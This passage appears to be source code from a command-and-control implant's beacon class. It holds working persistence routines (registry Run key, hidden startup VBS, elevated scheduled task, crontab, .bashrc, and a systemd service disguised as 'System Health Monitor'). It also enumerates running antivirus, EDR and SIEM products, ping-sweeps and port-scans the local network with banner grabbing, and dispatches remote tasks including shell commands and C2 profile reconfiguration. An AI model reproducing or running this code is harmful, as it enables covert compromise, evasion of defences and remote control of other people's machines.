        `python3 -c '<blob>'`, where `sys.argv[0]` is the literal "-c"
        and the answer is useless. A build that brought an interpreter is
        exactly the build that can do better, so it does.
        """
        bundled = self._bundled_payload()
        if bundled:
            return "" if self._persist_gate == "argc" else bundled
        return os.path.abspath(sys.argv[0])

    def _exec_persist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        beacon_path = self._get_beacon_path()
        python_path = sys.executable
        # No path to name: the startup hook is what finds the payload.
        cmd_line = ("%s %s" % (python_path, beacon_path) if beacon_path
                    else python_path)
        name = self._persist_name

        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                if platform.system() != "Windows":
                    return "[error] Registry persistence only available on Windows"
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, cmd_line)
                winreg.CloseKey(key)
                return f"Persistence installed: HKCU\\...\\Run\\{name}\n{cmd_line}"

            elif method == "startup":
                if platform.system() != "Windows":
                    return "[error] Startup folder persistence only available on Windows"
                startup = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup"
                lnk_vbs = startup / "SystemHealth.vbs"
                lnk_vbs.write_text(
                    f'CreateObject("WScript.Shell").Run "{cmd_line}", 0, False\n'
                )
                return f"Persistence installed: {lnk_vbs}"

            elif method == "schtask":
                if platform.system() != "Windows":
                    return "[error] Scheduled task persistence only available on Windows"
                result = subprocess.run(
                    ["schtasks", "/create", "/tn", name,
                     "/tr", cmd_line, "/sc", "onlogon", "/rl", "highest", "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                if result.returncode == 0:
                    return f"Persistence installed: schtask {name}\n{result.stdout.strip()}"
                return f"[error] {result.stderr.strip()}"

            elif method == "crontab":
                if platform.system() == "Windows":
                    return "[error] Crontab not available on Windows"
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                lines = existing.stdout if existing.returncode == 0 else ""
                marker = "# raccoon-persist"
                if marker in lines:
                    return "Persistence already installed (crontab)"
                entry = f"@reboot {cmd_line} {marker}\n"
                new_cron = lines.rstrip("\n") + "\n" + entry
                proc = subprocess.run(
                    ["crontab", "-"], input=new_cron, capture_output=True, text=True, timeout=10,
                )
                if proc.returncode == 0:
                    return f"Persistence installed: crontab @reboot\n{cmd_line}"
                return f"[error] {proc.stderr.strip()}"

            elif method == "bashrc":
                if platform.system() == "Windows":
                    return "[error] bashrc not available on Windows"
                rc = Path.home() / ".bashrc"
                marker = "# raccoon-persist"
                content = rc.read_text() if rc.exists() else ""
                if marker in content:
                    return "Persistence already installed (.bashrc)"
                line = f"\n(nohup {cmd_line} &>/dev/null &) {marker}\n"
                rc.write_text(content + line)
                return f"Persistence installed: ~/.bashrc"

            elif method == "systemd":
                if platform.system() == "Windows":
                    return "[error] systemd not available on Windows"
                svc_dir = Path.home() / ".config" / "systemd" / "user"
                svc_dir.mkdir(parents=True, exist_ok=True)
                svc = svc_dir / "system-health.service"
                svc.write_text(
                    f"[Unit]\nDescription=System Health Monitor\n\n"
                    f"[Service]\nExecStart={cmd_line}\nRestart=always\n"
                    f"RestartSec=30\n\n[Install]\nWantedBy=default.target\n"
                )
                subprocess.run(
                    ["systemctl", "--user", "enable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                return f"Persistence installed: systemd user service\n{svc}"

            else:
                return f"[error] Unknown method: {method}\nAvailable: auto, registry, startup, schtask, crontab, bashrc, systemd"

        except Exception as e:
            return f"[error] {e}"

    def _exec_unpersist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        # The same value `_exec_persist` wrote, read from the same place.
        name = self._persist_name
        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                try:
                    winreg.DeleteValue(key, name)
                except FileNotFoundError:
                    return "No registry persistence found"
                finally:
                    winreg.CloseKey(key)
                return "Registry persistence removed"

            elif method == "startup":
                lnk = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup\SystemHealth.vbs"
                if lnk.exists():
                    lnk.unlink()
                    return f"Startup persistence removed: {lnk}"
                return "No startup persistence found"

            elif method == "schtask":
                result = subprocess.run(
                    ["schtasks", "/delete", "/tn", name, "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                return result.stdout.strip() or result.stderr.strip() or "Scheduled task removed"

            elif method == "crontab":
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                if existing.returncode != 0:
                    return "No crontab found"
                marker = "# raccoon-persist"
                lines = [l for l in existing.stdout.splitlines() if marker not in l]
                subprocess.run(
                    ["crontab", "-"], input="\n".join(lines) + "\n",
                    capture_output=True, text=True, timeout=10,
                )
                return "Crontab persistence removed"

            elif method == "bashrc":
                rc = Path.home() / ".bashrc"
                if not rc.exists():
                    return "No .bashrc found"
                marker = "# raccoon-persist"
                lines = [l for l in rc.read_text().splitlines() if marker not in l]
                rc.write_text("\n".join(lines) + "\n")
                return ".bashrc persistence removed"

            elif method == "systemd":
                subprocess.run(
                    ["systemctl", "--user", "disable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                svc = Path.home() / ".config" / "systemd" / "user" / "system-health.service"
                if svc.exists():
                    svc.unlink()
                return "Systemd persistence removed"

            else:
                return f"[error] Unknown method: {method}"

        except Exception as e:
            return f"[error] {e}"

    def _exec_proxyinfo(self) -> str:
        lines = [f"Proxy mode: {self.proxy_mode}"]
        if self.proxy_url:
            lines.append(f"Configured URL: {self.proxy_url}")
        if self._ntlm_relay:
            lines.append("")
            lines.append("NTLM relay: active")
            lines.append(f"  Local listener: {self._ntlm_relay.url}")
            lines.append(f"  Upstream proxy: {self._ntlm_relay.upstream_url}")
            lines.append(f"  Identity:       {self._ntlm_relay.identity}")
        elif self._proxy_ntlm_cfg.get("enabled"):
            lines.append("")
            lines.append("NTLM relay: configured but not running")
        lines.append("")
        lines.append(self._proxy.summary())
        if self._proxy_session and self._proxy_session.proxies:
            lines.append("")
            lines.append("Session proxies:")
            for scheme, url in self._proxy_session.proxies.items():
                lines.append(f"  {scheme}: {url}")
        return "\n".join(lines)

    # ── AV / EDR enumeration ──

    _AV_SERVICES_WIN = [
        ("WinDefend", "Windows Defender", "av"),
        ("Sense", "Defender for Endpoint (EDR)", "edr"),
        ("CbDefense", "Carbon Black Defense", "edr"),
        ("CbDefenseSensor", "Carbon Black Sensor", "edr"),
        ("CSFalconService", "CrowdStrike Falcon", "edr"),
        ("SentinelAgent", "SentinelOne", "edr"),
        ("SentinelStaticEngine", "SentinelOne Static", "edr"),
        ("cyabortsvc", "Cortex XDR", "edr"),
        ("CortexXDR", "Cortex XDR", "edr"),
        ("elastic-agent", "Elastic Agent", "edr"),
        ("elastic-endpoint", "Elastic Endpoint", "edr"),
        ("xagt", "Trellix/FireEye HX", "edr"),
        ("CylanceSvc", "Cylance", "edr"),
        ("TaniumClient", "Tanium", "edr"),
        ("QualysAgent", "Qualys Agent", "edr"),
        ("ir_agent", "Rapid7 InsightAgent", "edr"),
        ("AVP", "Kaspersky", "av"),
        ("klnagent", "Kaspersky Network Agent", "av"),
        ("EPSecurityService", "Bitdefender", "av"),
        ("BDAuxSrv", "Bitdefender Aux", "av"),
        ("SAVService", "Sophos AV", "edr"),
        ("SophosAgent", "Sophos Agent", "edr"),
        ("hmpalert", "Sophos Intercept X", "edr"),
        ("McShield", "McAfee/Trellix", "av"),
        ("masvc", "McAfee Agent", "av"),
        ("mfemms", "McAfee Management", "av"),
        ("ekrn", "ESET", "av"),
        ("AvastSvc", "Avast", "av"),
        ("avgnt", "AVG", "av"),
        ("fshoster", "WithSecure/F-Secure", "av"),
        ("ccSvcHst", "Symantec SEP", "av"),
        ("SepMasterService", "Symantec Master", "av"),
        ("SplunkForwarder", "Splunk Forwarder", "siem"),
        ("splunkd", "Splunk Daemon", "siem"),
        ("wazuh-agent", "Wazuh Agent", "siem"),
        ("OssecSvc", "OSSEC", "siem"),
        ("Sysmon", "Sysmon", "audit"),
        ("Sysmon64", "Sysmon x64", "audit"),
        ("osqueryd", "osquery", "audit"),
    ]

    _AV_PROCS_LINUX = [
        ("clamd", "ClamAV", "av"),
        ("freshclam", "ClamAV Updater", "av"),
        ("falcon-sensor", "CrowdStrike Falcon", "edr"),
        ("cbagentd", "Carbon Black", "edr"),
        ("SentinelAgent", "SentinelOne", "edr"),
        ("elastic-agent", "Elastic Agent", "edr"),
        ("elastic-endpoint", "Elastic Endpoint", "edr"),
        ("xagt", "Trellix/FireEye HX", "edr"),
        ("cortex-xdr", "Cortex XDR", "edr"),
        ("splunkd", "Splunk", "siem"),
        ("wazuh-agentd", "Wazuh", "siem"),
        ("ossec-agentd", "OSSEC", "siem"),
        ("ossec-syscheckd", "OSSEC Syscheck", "siem"),
        ("auditd", "Linux Audit", "audit"),
        ("osqueryd", "osquery", "audit"),
        ("snort", "Snort IDS", "ids"),
        ("suricata", "Suricata IDS", "ids"),
        ("velociraptor", "Velociraptor DFIR", "dfir"),
        ("grr_agent", "GRR Agent", "dfir"),
        ("savd", "Sophos AV", "edr"),
        ("SophosAgent", "Sophos Agent", "edr"),
    ]

    def _exec_avenum(self) -> str:
        """Enumerate AV/EDR/SIEM/audit tools on the system."""
        findings = []
        system = platform.system()

        if system == "Windows":
            # Check services via sc query
            for svc_name, display, cat in self._AV_SERVICES_WIN:
                try:
                    r = subprocess.run(
                        ["sc", "query", svc_name],
                        capture_output=True, text=True, timeout=5,
                    )
                    if r.returncode == 0 and "RUNNING" in r.stdout:
                        findings.append((display, cat, "running"))
                    elif r.returncode == 0 and "STOPPED" in r.stdout:
                        findings.append((display, cat, "stopped"))
                except Exception:
                    pass

            # WMI AntiVirusProduct (SecurityCenter2)
            try:
                r = subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     "Get-CimInstance -Namespace root/SecurityCenter2 "
                     "-ClassName AntiVirusProduct | "
                     "Select-Object displayName,productState | "
                     "Format-List"],
                    capture_output=True, text=True, timeout=15,
                )
                if r.returncode == 0 and r.stdout.strip():
                    for block in r.stdout.split("\n\n"):
                        name = ""
                        state = ""
                        for line in block.splitlines():
                            if "displayName" in line:
                                name = line.split(":", 1)[-1].strip()
                            if "productState" in line:
                                state = line.split(":", 1)[-1].strip()
                        if name:
                            try:
                                ps = int(state)
                                enabled = bool((ps >> 12) & 1)
                                updated = not bool((ps >> 4) & 1)
                            except (ValueError, TypeError):
                                enabled, updated = None, None
                            status_parts = []
                            if enabled is True:
                                status_parts.append("enabled")
                            elif enabled is False:
                                status_parts.append("disabled")
                            if updated is True:
                                status_parts.append("up-to-date")
                            elif updated is False:
                                status_parts.append("outdated")
                            status_str = ", ".join(status_parts) if status_parts else "registered"
                            already = any(name.lower() in f[0].lower() for f in findings)
                            if not already:
                                findings.append((name, "av/wmi", status_str))
            except Exception:
                pass

            # Check Windows Firewall
            try:
                r = subprocess.run(
                    ["netsh", "advfirewall", "show", "allprofiles", "state"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    on_count = r.stdout.lower().count("on")
                    off_count = r.stdout.lower().count("off")
                    findings.append(("Windows Firewall", "fw",
                                     f"{on_count} on / {off_count} off"))
            except Exception:
                pass

            # Check AMSI via registry
            try:
                r = subprocess.run(
                    ["reg", "query",
                     r"HKLM\SOFTWARE\Microsoft\AMSI\Providers"],
                    capture_output=True, text=True, timeout=5,
                )
                provider_count = sum(1 for l in r.stdout.splitlines()
                                     if l.strip().startswith("HKEY"))
                findings.append(("AMSI", "audit",
                                 f"{provider_count} providers"))
            except Exception:
                pass

            # Check AppLocker
            try:
                r = subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     "(Get-AppLockerPolicy -Effective).RuleCollections.Count"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0 and r.stdout.strip():
                    cnt = r.stdout.strip()
                    findings.append(("AppLocker", "policy",
                                     f"{cnt} rule collections"))
            except Exception:
                pass

        else:
            # Linux: check running processes
            try:
                r = subprocess.run(
                    ["ps", "axo", "comm"], capture_output=True,
                    text=True, timeout=10,
                )
                procs = set(r.stdout.strip().splitlines())
                for proc_name, display, cat in self._AV_PROCS_LINUX:
                    if proc_name in procs:
                        findings.append((display, cat, "running"))
            except Exception:
                pass

            # Check iptables rules count
            try:
                r = subprocess.run(
                    ["iptables", "-L", "-n", "--line-numbers"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    rules = sum(1 for l in r.stdout.splitlines()
                                if l and not l.startswith("Chain")
                                and not l.startswith("num"))
                    findings.append(("iptables", "fw", f"{rules} rules"))
            except Exception:
                pass

            # Check SELinux
            try:
                r = subprocess.run(
                    ["getenforce"], capture_output=True, text=True, timeout=5,
                )
                if r.returncode == 0:
                    findings.append(("SELinux", "policy",
                                     r.stdout.strip().lower()))
            except Exception:
                pass

            # Check AppArmor
            try:
                aa = Path("/sys/kernel/security/apparmor/profiles")
                if aa.exists():
                    count = sum(1 for _ in aa.read_text().splitlines())
                    findings.append(("AppArmor", "policy",
                                     f"{count} profiles"))
            except Exception:
                pass

        if not findings:
            return "No AV/EDR/SIEM tools detected (limited enumeration)"

        lines = [f"{'Tool':<35} {'Category':<10} {'Status':<20}",
                 "-" * 65]
        for name, cat, status in findings:
            lines.append(f"{name:<35} {cat:<10} {status:<20}")
        lines.append(f"\n{len(findings)} security tool(s) detected on "
                      f"{platform.node()} ({system})")
        return "\n".join(lines)

    # ── ARP table ──

    _MAC_PREFIXES = {
        "00:50:56": "VMware", "00:0c:29": "VMware", "00:05:69": "VMware",
        "00:1c:14": "VMware", "00:15:5d": "Hyper-V", "08:00:27": "VirtualBox",
        "0a:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
        "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
        "e4:5f:01": "Raspberry Pi", "d8:3a:dd": "Raspberry Pi",
        "ac:de:48": "Apple", "00:1b:63": "Apple", "3c:22:fb": "Apple",
        "f8:ff:c2": "Apple",
        "00:1a:a0": "Dell", "f8:db:88": "Dell", "00:14:22": "Dell",
        "00:1e:c9": "Dell",
        "00:25:b5": "HP", "3c:d9:2b": "HP", "d4:c9:ef": "HP",
        "70:10:6f": "HP",
        "00:1c:c0": "Intel", "a4:bf:01": "Intel", "00:1b:21": "Intel",
        "f8:63:3f": "Intel",
        "00:04:4b": "Nvidia", "48:b0:2d": "Nvidia",
        "b4:2e:99": "Cisco", "00:1b:0d": "Cisco", "00:1e:14": "Cisco",
        "00:26:0b": "Cisco", "00:50:0f": "Cisco",
        "00:09:0f": "Fortinet", "00:60:b0": "Hewlett Packard",
        "f0:9f:c2": "Ubiquiti", "24:a4:3c": "Ubiquiti",
        "44:d9:e7": "Ubiquiti", "fc:ec:da": "Ubiquiti",
        "00:1a:2b": "Juniper", "00:05:85": "Juniper",
        "00:23:9c": "Juniper",
        "00:0d:b9": "PC Engines", "00:08:e3": "Huawei",
        "00:e0:fc": "Huawei", "48:46:fb": "Huawei",
        "08:00:20": "Sun/Oracle", "00:03:ba": "Sun/Oracle",
        "00:1d:09": "TP-Link", "50:c7:bf": "TP-Link",
        "ec:08:6b": "TP-Link",
        "a8:5e:45": "ASUS", "00:1a:92": "ASUS",
        "00:1f:1f": "ASUS",
        "bc:5f:f4": "ASRock", "d0:50:99": "ASRock",
        "00:0e:8f": "Netgear", "c0:ff:d4": "Netgear",
        "30:46:9a": "Netgear",
        "e0:91:f5": "Synology", "00:11:32": "Synology",
        "c4:3d:c7": "Netgear", "20:cf:30": "QNAP",
        "00:08:9b": "QNAP",
        "b0:be:76": "TP-Link", "14:cc:20": "TP-Link",
        "00:24:d4": "Freebox", "68:a3:78": "Freebox",
        "02:42": "Docker",
    }

    @classmethod
    def _mac_vendor(cls, mac: str) -> str:
        m = mac.lower().replace("-", ":")
        for prefix_len in (8, 5):
            prefix = m[:prefix_len]
            if prefix in cls._MAC_PREFIXES:
                return cls._MAC_PREFIXES[prefix]
        return ""

    @staticmethod
    def _guess_os(ports: list, vendor: str) -> str:
        ps = set(ports)
        if 3389 in ps or 135 in ps or 139 in ps:
            return "Windows"
        if 548 in ps or 5353 in ps:
            return "macOS" if "Apple" in vendor else "Apple/macOS"
        if 22 in ps and 111 in ps:
            return "Linux/Unix"
        if 22 in ps:
            return "Linux"
        if 80 in ps or 443 in ps:
            if vendor:
                if "Cisco" in vendor or "Juniper" in vendor or "Fortinet" in vendor:
                    return "Network Device"
                if "Ubiquiti" in vendor:
                    return "Ubiquiti AP"
                if "Synology" in vendor or "QNAP" in vendor:
                    return "NAS"
            return "Web Device"
        if vendor and ("Raspberry" in vendor):
            return "Linux (RPi)"
        return ""

    @staticmethod
    def _probe_ports(ip: str, ports: list, timeout: float = 0.8) -> list:
        open_ports = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, p))
                open_ports.append(p)
                s.close()
            except Exception:
                pass
        return open_ports

    _SSL_PORTS = {443, 993, 995, 8443, 636, 989, 990, 992, 5986, 9443}

    @staticmethod
    def _grab_banner(ip: str, port: int, timeout: float = 1.5) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            if port in Beacon._SSL_PORTS or port == 443:
                s.close()
                return Beacon._probe_ssl(ip, port, timeout)
            if port in (80, 8080, 8888, 9090):
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\nConnection: close\r\n\r\n")
            elif port == 21:
                pass
            elif port == 25:
                pass
            else:
                s.sendall(b"\r\n")
            s.settimeout(2.0)
            data = s.recv(512)
            s.close()
            line = data.decode("utf-8", errors="replace").split("\n")[0].strip()
            return line[:160]
        except Exception:
            return ""

    @staticmethod
    def _probe_ssl(ip: str, port: int, timeout: float = 2.0) -> str:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, port), timeout=timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    der = ssock.getpeercert(binary_form=True)
                    ver = ssock.version() or "?"
                    if cert:
                        subj = dict(x[0] for x in cert.get("subject", ()))
                        cn = subj.get("commonName", "?")
                        issuer = dict(x[0] for x in cert.get("issuer", ()))
                        issuer_cn = issuer.get("commonName", issuer.get("organizationName", "?"))
                        not_after = cert.get("notAfter", "?")
                        san_list = []
                        for typ, val in cert.get("subjectAltName", ()):
                            if typ == "DNS":
                                san_list.append(val)
                        san = ", ".join(san_list[:4])
                        parts = [ver, f"CN={cn}"]
                        if issuer_cn != cn:
                            parts.append(f"Issuer={issuer_cn}")
                        parts.append(f"Expires={not_after}")
                        if san:
                            parts.append(f"SAN=[{san}]")
                        return " | ".join(parts)
                    else:
                        return f"{ver} | self-signed/no-cert"
        except ssl.SSLError as e:
            return f"SSL-Error: {str(e)[:80]}"
        except Exception:
            return "SSL"

    _PORT_NAMES = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
        548: "AFP", 631: "IPP", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
        5353: "mDNS", 5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM",
        6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        8888: "HTTP-Alt", 9090: "HTTP-Alt", 9200: "Elasticsearch",
        27017: "MongoDB",
    }

    def _ping_sweep(self):
        local_ips = self._get_local_ips()
        if not local_ips:
            return
        bases = set()
        for ip in local_ips:
            parts = ip.rsplit(".", 1)
            if len(parts) == 2:
                bases.add(parts[0])

        def _ping(target):
            try:
                if platform.system() == "Windows":
                    subprocess.run(
                        ["ping", "-n", "1", "-w", "500", target],
                        capture_output=True, timeout=3,
                    )
                else:
                    subprocess.run(
                        ["ping", "-c", "1", "-W", "1", target],
                        capture_output=True, timeout=3,
                    )
            except Exception:
                pass

        threads = []
        for base in list(bases)[:3]:
            for i in range(1, 255):
                t = threading.Thread(target=_ping, args=(f"{base}.{i}",), daemon=True)
                threads.append(t)
                t.start()
                if len(threads) >= 30:
                    for tt in threads:
                        tt.join(timeout=2)
                    threads = []
        for tt in threads:
            tt.join(timeout=2)

    def _exec_arptable(self) -> str:
        self._ping_sweep()
        entries = []
        try:
            if platform.system() == "Windows":
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].count(".") == 3:
                        ip = parts[0]
                        mac = parts[1].replace("-", ":")
                        typ = parts[2] if len(parts) > 2 else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": typ})
            else:
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                if r.returncode != 0:
                    r = subprocess.run(
                        ["ip", "neigh", "show"], capture_output=True, text=True, timeout=10,
                    )
                for line in r.stdout.splitlines():
                    ip_m = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
                    mac_m = re.search(r"([\da-fA-F]{2}[:-]){5}[\da-fA-F]{2}", line)
                    if ip_m:
                        ip = ip_m.group(1)
                        mac = mac_m.group(0) if mac_m else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": "?"})
        except Exception as e:
            return f"[error] {e}"

        seen_ips = set()
        unique = []
        for ent in entries:
            if ent["ip"] not in seen_ips:
                seen_ips.add(ent["ip"])
                unique.append(ent)
        entries = unique

        my_ips = set(self._get_local_ips())
        common_ports = [21,22,23,25,53,80,110,111,135,139,143,161,389,
                        443,445,548,636,631,993,995,1433,1521,
                        3306,3389,5353,5432,5900,5985,5986,
                        6379,8080,8443,8888,9090,9200,9443,27017]
        threads = []
        lock = threading.Lock()

        def enrich(ent):
            ip = ent["ip"]
            try:
                h = socket.getfqdn(ip)
                ent["hostname"] = "" if h == ip else h
            except Exception:
                ent["hostname"] = ""
            ent["vendor"] = self._mac_vendor(ent["mac"])
            ent["ports"] = self._probe_ports(ip, common_ports)
            ent["os_guess"] = self._guess_os(ent["ports"], ent["vendor"])
            ent["self"] = ip in my_ips
            banners = {}
            for p in ent["ports"][:8]:
                b = self._grab_banner(ip, p)
                if b:
                    banners[str(p)] = b
            ent["banners"] = banners
            port_info = []
            for p in ent["ports"]:
                name = self._PORT_NAMES.get(p, "")
                banner = banners.get(p, "")
                s = str(p)
                if name:
                    s += "/" + name
                if banner:
                    s += " (" + banner + ")"
                port_info.append(s)
            ent["port_info"] = port_info

        for ent in entries:
            t = threading.Thread(target=enrich, args=(ent,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 10:
                for tt in threads:
                    tt.join(timeout=5)
                threads = []
        for tt in threads:
            tt.join(timeout=5)

        result = json.dumps({"entries": entries, "count": len(entries)})
        return result

    # ── Network scan ──

    def _exec_netscan(self, args: str) -> str:
        timeout_s = 1
        parts = args.strip().split() if args else []
        subnet = parts[0] if parts else ""

        if not subnet:
            for ip in self._get_local_ips():
                octets = ip.rsplit(".", 1)
                if len(octets) == 2:
                    subnet = octets[0] + ".0/24"
                    break

        if not subnet:
            return "[error] No subnet specified and no local IP found"

        base = subnet.split("/")[0].rsplit(".", 1)[0]
        results = []
        results.append(f"Scanning {base}.0/24 ...")

        def _ping_host(ip):
            try:
                if platform.system() == "Windows":
                    r = subprocess.run(
                        ["ping", "-n", "1", "-w", str(timeout_s * 1000), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                else:
                    r = subprocess.run(
                        ["ping", "-c", "1", "-W", str(timeout_s), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                return r.returncode == 0
            except Exception:
                return False

        def _tcp_probe(ip, port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout_s)
                s.connect((ip, port))
                s.close()
                return True
            except Exception:
                return False

        alive = []
        threads = []
        lock = threading.Lock()

        def scan_host(ip):
            if _ping_host(ip) or _tcp_probe(ip, 445) or _tcp_probe(ip, 22):
                hostname = ""
                try:
                    hostname = socket.getfqdn(ip)
                    if hostname == ip:
                        hostname = ""
                except Exception:
                    pass
                ports = []
                for p in [22, 80, 135, 139, 443, 445, 3389, 8080, 8443]:
                    if _tcp_probe(ip, p):
                        ports.append(p)
                with lock:
                    alive.append({"ip": ip, "hostname": hostname, "ports": ports})

        for i in range(1, 255):
            ip = f"{base}.{i}"
            t = threading.Thread(target=scan_host, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=timeout_s + 3)
                threads = []

        for t in threads:
            t.join(timeout=timeout_s + 3)

        alive.sort(key=lambda h: tuple(int(o) for o in h["ip"].split(".")))
        my_ips = set(self._get_local_ips())

        for h in alive:
            marker = " [SELF]" if h["ip"] in my_ips else ""
            port_str = ",".join(str(p) for p in h["ports"]) if h["ports"] else "-"
            host_str = f' ({h["hostname"]})' if h["hostname"] else ""
            results.append(f'  {h["ip"]}{host_str}  ports:[{port_str}]{marker}')

        results.append(f"\n{len(alive)} hosts alive")
        return "\n".join(results)

    # ── Task dispatcher ──

    def _process_tasking_batch(self, tasking: dict):
        """Run a {"tasks": [...]} batch in order, or a lone task dict from an
        older server once."""
        if not tasking:
            return
        if "tasks" not in tasking:
            self._process_tasking(tasking)
            return
        tasks = tasking["tasks"]
        if not isinstance(tasks, list):
            logger.warning("Ignoring malformed task batch: %s", type(tasks).__name__)
            return
        for task in tasks:
            if not isinstance(task, dict):
                continue
            try:
                self._process_tasking(task)
            except Exception as e:
                logger.warning("Task %s failed: %s", task.get("id", "?"), e)
            # kill clears _running; the rest of the batch must not follow it.
            if not self._running:
                break

    def _process_tasking(self, tasking: dict):
        if not tasking:
            return

        cmd = tasking.get("cmd", "")
        args = tasking.get("args", "")
        task_id = tasking.get("id", "")
        data = tasking.get("data", "")

        status = "ok"
        output = ""
        result_data = None

        try:
            if cmd == "reconfig":
                try:
                    reconf = json.loads(data) if isinstance(data, str) else data
                    parts = []
                    if "c2_profile" in reconf:
                        self._c2_profile = reconf["c2_profile"]
                        parts.append("C2 profile updated")
                        if self._c2_profile.get("useragent"):
                            parts.append(f"UA: {self._c2_profile['useragent'][:60]}")
                        n_get = len(self._c2_profile.get("http_get", {}).get("uris", []))
                        n_post = len(self._c2_profile.get("http_post", {}).get("uris", []))
                        if n_get or n_post:
                            parts.append(f"URIs: {n_get} GET, {n_post} POST")
                        logger.info("C2 profile reconfigured dynamically")
                    if reconf.get("sleeptime"):
                        asked = int(reconf["sleeptime"]) / 1000
                        self.interval = _clamp_interval(asked)
                        if self.interval != asked:
                            parts.append(f"interval={self.interval}s "
                                         f"(asked {asked}s, floor is "
                                         f"{_MIN_INTERVAL}s)")
                        else:
                            parts.append(f"interval={self.interval}s")
                    if reconf.get("jitter"):
                        self.jitter = max(0, min(100, int(reconf["jitter"]))) / 100.0
                        parts.append(f"jitter={int(self.jitter*100)}%")
                    output = " — ".join(parts) if parts else "No changes applied"
                except Exception as e:
                    status = "error"
                    output = f"Reconfig failed: {e}"

            elif cmd == "sleep":
                parts = str(args).split()
                asked = float(parts[0])
                self.interval = _clamp_interval(asked)
                if len(parts) > 1:
                    self.jitter = max(0, min(100, float(parts[1]))) / 100.0
                output = f"Sleep {self.interval}s jitter {int(self.jitter * 100)}%"
                if self.interval != asked:
                    # Said rather than clamped in silence. Clamping without
                    # saying so is what made a healthy beacon look like a
                    # failing one for as long as this project has existed:
                    # it reported the number it was asked for and honoured
                    # a different one.
                    output += (f" (asked {asked:g}s; the floor is "
                               f"{_MIN_INTERVAL}s)")
                logger.info(output)

            elif cmd == "kill":
                logger.warning("Kill command received")
                output = "Shutting down"
                self._running = False

            elif cmd == "shell":
                timeout = tasking.get("timeout", 300)
                output = self._exec_shell(args, timeout=timeout)

            elif cmd == "ls":
                output = self._exec_ls(args or ".")
            elif cmd == "lsjson":
                output = self._exec_lsjson(args or ".")

            elif cmd == "cat":
                output = self._exec_cat(args)

            elif cmd == "pwd":
                output = self._exec_pwd()

            elif cmd == "cd":
                output = self._exec_cd(args)

            elif cmd == "cp":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_cp(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: cp <src> <dst>"

            elif cmd == "mv":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_mv(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: mv <src> <dst>"

            elif cmd == "rm":
                output = self._exec_rm(args)

            elif cmd == "mkdir":
                output = self._exec_mkdir(args)

            elif cmd == "chmod":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_chmod(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: chmod <mode> <path>"

